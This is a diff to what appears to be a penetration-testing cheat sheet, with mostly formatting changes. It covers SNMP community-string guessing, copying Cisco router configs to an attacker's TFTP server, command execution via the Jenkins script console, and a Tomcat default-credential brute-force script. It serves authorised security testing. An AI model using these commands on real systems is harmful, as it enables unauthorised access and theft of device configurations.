@@ -90,14 +90,12 @@ References:
 
 ## UDP/161 SNMP
 - Run `onesixtyone` to guess some SNMP strings:
-
   ```
   wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -o snmp-strings.txt
   onesixtyone -c snmp-strings.txt -i hosts.txt -o onesixtyone-snmp-guess.txt
   ```
 
 - Parse `onesixtyone` results so it's `10.10.10.10 public` in a txt file, then run this py script to `snmp-check` all the things and check if any is RW access:
-
   ```
   #!/usr/bin/env python
   import os, sys
@@ -116,8 +114,7 @@ References:
   file.close
   ```
 
-- Set up FTP server and FTP using a SNMP write string. Similar method for TFTP (which doesn't try to auth but could be blocked). Check the blog for TFTP instructions. Remember to have a 777 file in the TFTP root you're using.
-  
+- Set up FTP server and FTP using a SNMP write string. Similar method for TFTP (which doesn't try to auth but could be blocked). Check the blog for TFTP instructions. Remember to have a 777 file in the TFTP root you're using.  
   ```
   # Install FTP server.
   # See https://www.ciscozine.com/how-to-save-configurations-using-snmp/
@@ -137,7 +134,6 @@ References:
   ```
 
 - Do it over TFTP:
-
   ```
   # 336 is the ID, it lasts 5 minutes. You can clear it if needed.
   snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.2.336 i 1
@@ -147,6 +143,7 @@ References:
   snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.6.336 s [file-name]   # don't forget touch && chmod 777
   snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.14.336 i 1
   ```
+
 - `muts` wrote a [quick perl script to copy over the config](https://tools.kali.org/information-gathering/copy-router-config), native to Kali:
   ```
   copy-router-config.pl target_router evil_tftp_server private_snmp_string
@@ -166,18 +163,18 @@ Includes web services (not just port 80)
   - Auth can bind to AD or be local. Check `/asynchPeople/` for a list of users anonymously.
   - To run commands:
     - If you're an admin users, you can access the script console directly at `/script/`
-      ```
-      def sout = new StringBuffer(), serr = new StringBuffer()
-      def proc = '[INSERT COMMAND]'.execute()
-      proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000)
-      println "out> $sout err> $serr"
-      ```
+    ```
+    def sout = new StringBuffer(), serr = new StringBuffer()
+    def proc = '[INSERT COMMAND]'.execute()
+    proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000)
+    println "out> $sout err> $serr"
+    ```
     - For non-admins, but those who can create/add/edit builds, you can run a build cmd
       - Edit the build, add a build step, "Execute Windows batch cmd", and then `powershell.exe -c` away!
       - If build steps/commands exist, move yours to the top. If any step fails, it cancels the subsequent ones
 - Check for Splunk
 - Check for Tomcat:
-```
+  ```
   #!/bin/bash
   USERS="tomcat admin manager role role1 root"
   PASSS="password Password1 password1 admin tomcat tomcat manager role1 tomcat changethis Password1 changethis password password1 r00t root toor tomcat s3cret password1 password admin changethis"
@@ -192,7 +189,7 @@ Includes web services (not just port 80)
       curl -s -k -i http://$USER:@$HOST/manager/html | grep '200 OK'
     done
   done
-```
+  ```
 
 ## TCP/3389 Remote Desktop Protocol (RDP)
 - Scan for BlueKeep:
